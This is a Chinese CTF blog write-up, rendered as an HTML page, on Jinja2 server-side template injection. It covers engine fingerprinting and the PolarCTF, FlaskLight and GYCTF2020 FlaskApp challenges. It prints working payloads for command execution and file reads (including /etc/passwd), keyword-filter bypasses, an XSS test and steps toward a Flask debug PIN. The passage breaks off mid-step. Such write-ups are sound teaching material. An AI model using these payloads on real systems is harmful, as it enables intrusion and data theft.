@@ -1,0 +1,816 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/blog.jpg">
+  <link rel="icon" href="/img/blog.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSTI模板注入SSTI就是服务器端模板注入，SSTI是注入类的漏洞， 注入漏洞的根本原因，是当攻击者向应用程序发送恶意数据的时候，应用程序并未进行校验，直接传递给到解释器，解释器是不会对攻击者输入的恶意数据进行校验，而是直接翻译成机器可以执行的语句， SSTI是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。与sql注入不同的是SSTI利用的是现在的网站模板引擎，主要针对pyt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI模板注入">
+<meta property="og:url" content="http://example.com/2023/04/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="TTblog">
+<meta property="og:description" content="SSTI模板注入SSTI就是服务器端模板注入，SSTI是注入类的漏洞， 注入漏洞的根本原因，是当攻击者向应用程序发送恶意数据的时候，应用程序并未进行校验，直接传递给到解释器，解释器是不会对攻击者输入的恶意数据进行校验，而是直接翻译成机器可以执行的语句， SSTI是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。与sql注入不同的是SSTI利用的是现在的网站模板引擎，主要针对pyt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180908041.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180913698.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180913607.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180934156.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180952744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180935337.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180938692.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180939801.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180939528.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945180.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942229.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942306.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942344.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942273.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942536.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942148.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945927.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945956.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180944005.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945378.png">
+<meta property="article:published_time" content="2023-04-13T08:35:20.000Z">
+<meta property="article:modified_time" content="2023-04-19T14:16:28.062Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SSTI">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180908041.png">
+  
+  
+  
+  <title>SSTI模板注入 - TTblog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>不会做题的菜鸡</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>主页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>文章</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>类别</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SSTI模板注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-13 16:35" pubdate>
+          April 13, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          67 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SSTI模板注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><p>SSTI就是服务器端模板注入，SSTI是注入类的漏洞，</p>
+<p>注入漏洞的根本原因，是当攻击者向应用程序发送恶意数据的时候，应用程序并未进行校验，直接传递给到解释器，解释器是不会对攻击者输入的恶意数据进行校验，而是直接翻译成机器可以执行的语句，</p>
+<p>SSTI是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。与sql注入不同的是SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade  velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180908041.png" srcset="/img/loading.gif" lazyload alt="1668402095241-a8b00449-110b-40a3-98a6-952882c708d7"></p>
+<p>首先要测试出来是什么模板</p>
+<h2 id="polarctf-ssti"><a href="#polarctf-ssti" class="headerlink" title="polarctf ssti"></a>polarctf ssti</h2><p>以polarctf上的ssti为例</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180913698.png" srcset="/img/loading.gif" lazyload alt="image-20230418091303650"></p>
+<p>get传参name</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180913607.png" srcset="/img/loading.gif" lazyload alt="image-20230418091332557"></p>
+<p>使name&#x3D;6，顺手测试了一下XSS， </p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180934156.png" srcset="/img/loading.gif" lazyload alt="image-20230418093456114"></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?name</span>=<span class="hljs-number">1</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180952744.png" srcset="/img/loading.gif" lazyload alt="image-20230418095202694"></p>
+<p>返回6，在进行进一步测试6</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180935337.png" srcset="/img/loading.gif" lazyload alt="image-20230418093554293"></p>
+<p>返回222，由此可判定是jinja2模板,payload为</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">#命令执行：</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">#文件操作</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<p>其中第一条payload中的[id]可以替换成命令,如ls,cat等,第二条payload的[filename]也可替换成文件名称.  进行命令执行</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180938692.png" srcset="/img/loading.gif" lazyload alt="image-20230418093835630"></p>
+<p>类似的还有一道</p>
+<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>悉的ssti</p>
+<p> 打开网页，在源代码的注释里发现提示用GET传递search参数，又发现这是一个Flask网页，所以可能用到SSTI注入，现在需要搞清楚这个网页是什么模板。按照图示步骤：  </p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180939801.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>确定哪个模板注入的一般流程：</p>
+<ul>
+<li>在疑似注入点的地方输入${7*7},如果有结果为49</li>
+<li>继续输入a{<em>comment</em>}b,成功则是smarty引擎，以此类推</li>
+</ul>
+<p>有些时候不同的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E&spm=1001.2101.3001.7020">模板引擎</a>对同一输入49都有结果</p>
+<p>但是在Twig中结果是49，在jinja2中是7777777。</p>
+<p>将search的值改为49发现网页显示是7777777，所以确定是jinja2模板。</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180939528.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>   <a target="_blank" rel="noopener" href="https://www.yuque.com/u32809378/vszzu2/pwdzroqyxc3n7706">https://www.yuque.com/u32809378/vszzu2/pwdzroqyxc3n7706</a></p>
+<p>通过对python的对象继承一步步来实现文件读取和命令执行,思路大抵为：</p>
+<ol>
+<li>寻找父类type:’object’</li>
+<li>寻找子类</li>
+<li>寻找关于命令执行或者文件操作的模块：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">__class__ 返回类所属的对象<br>__mro__ 输出当前对象所调用的全部类包括其父类<br>__base__ 同 __mro__ 用来寻找基类<br>__subclasses__ 输出该类下所有的子类(返回列表)<br>__init__ 类的初始化方法<br>__globals__ 对包含函数全局变量的字典的引用<br></code></pre></td></tr></table></figure>
+
+
+
+<p> 两条pyhon2,python3通用的payload:  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#命令执行：</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br><span class="hljs-comment">#文件操作</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
+
+<p> 其中第一条payload中的[id]可以替换成命令,如ls,cat等,第二条payload的[filename]也可替换成文件名称.<br>进行命令执行<br>a. 目录读取</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[]</span>.**class**.**base**.**subclasses**()[59].**init**[&#x27;**glo&#x27;+&#x27;bals**&#x27;][&#x27;**builtins**&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">PS：由于使用[&#x27;**globals**&#x27;]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[&#x27;**glo&#x27;+&#x27;bals**&#x27;]</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[]</span>.**class**.**base**.**subclasses**()[59].**init**[&#x27;**glo&#x27;+&#x27;bals**&#x27;][&#x27;**builtins**&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;**import**(&#x27;os&#x27;).popen(&#x27;ls &#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">页面回显：bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">b. 读取目录flasklight</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[]</span>.**class**.**base**.**subclasses**()[59].**init**[&#x27;**glo&#x27;+&#x27;bals**&#x27;][&#x27;**builtins**&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;**import**(&#x27;os&#x27;).popen(&#x27;ls /flasklight&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">页面回显：app.py coomme_geeeett_youur_flek</span><br><span class="language-xml">c. cat文件 coomme_geeeett_youur_flek 得到flag</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[]</span>.**class**.**base**.**subclasses**()[59].**init**[&#x27;**glo&#x27;+&#x27;bals**&#x27;][&#x27;**builtins**&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;**import**(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek &#x27;).read()&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;% <span class="hljs-name">for</span> c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__<span class="hljs-string">&#x27;glo&#x27;</span>+<span class="hljs-string">&#x27;bals&#x27;</span>__[&#x27;__builtins__&#x27;].eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p> 知识点：<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020">flask</a>框架开启debug模式产生的漏洞，PIN码的产生过程和文件读取，字符串拼接绕过，倒序绕过过滤。  </p>
+<p> 首先，打开题目，是是一个base64加密和解密的界面  </p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945180.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 本题目存在SSTI  </p>
+<p>测试49</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942229.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 返回no no no ，说明存在</p>
+<p> 可能被过滤了关键字符，但是我们不知道关键字符，所以要读取一下源码app.py（直接用open）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942306.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>拼接进行绕过</p>
+<p>import &#x3D; imp + ort         os &#x3D;o+s</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].**class**.**base**.**subclasses**() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.**name**==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.**init**.**globals**[<span class="hljs-string">&#x27;**builtins**&#x27;</span>][<span class="hljs-string">&#x27;**imp&#x27;</span>+<span class="hljs-string">&#x27;ort**&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-string">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942344.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/this_is_the_fl&#x27;</span>+<span class="hljs-string">&#x27;ag.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942273.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>预期解</p>
+<p>文件包含，PIN码生成</p>
+<p>关于PIN码的相关资料请参考：Flask debug 模式 PIN 码生成机制安全性研究笔记</p>
+<p>得到PIN码需要六个信息，其中2和3易知</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">flask所登录的用户名<br>modname，一般是flask.app<br>getattr(app, “name”, app.class.name)。一般为Flask<br>flask库下app.py的绝对路径。这个可以由报错信息看出<br>当前网络的mac地址的十进制数。<br>机器的id。<br></code></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li>flask用户名可以通过读取&#x2F;etc&#x2F;passwd来知道</li>
+</ol>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942536.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ol>
+<li>app.py的绝对路径，可从报错信息得到</li>
+</ol>
+<p>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942148.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> \3. mac地址的十进制数  </p>
+<p> 首先要得到网卡 <strong>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</strong></p>
